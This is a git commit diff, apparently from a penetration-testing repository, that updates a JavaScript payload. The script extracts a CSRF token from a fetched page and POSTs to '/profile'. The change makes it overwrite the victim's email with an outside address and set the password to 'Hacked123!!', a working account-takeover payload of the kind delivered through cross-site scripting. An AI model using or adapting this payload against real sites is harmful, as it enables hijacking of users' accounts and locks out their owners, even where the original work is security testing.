52bd06b6f951143a4e21077c277eef7ac074d214
pentest133 <157604553+pentest133@users.noreply.github.com>
2024-12-27 17:38:03 +0100

    Update js.js

--- js.js
+++ js.js
@@ -6,5 +6,5 @@ function handleResponse() {
     var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
     var changeReq = new XMLHttpRequest();
     changeReq.open('POST', '/profile', true);
-    changeReq.send('_token='+token+'&name=HACKED')
+    changeReq.send('_token='+token+'&name=HACKED&email=bayan29846@chansd.com&gravataremail=&password=Hacked123!!&password_confirm=Hacked123!!')
 };
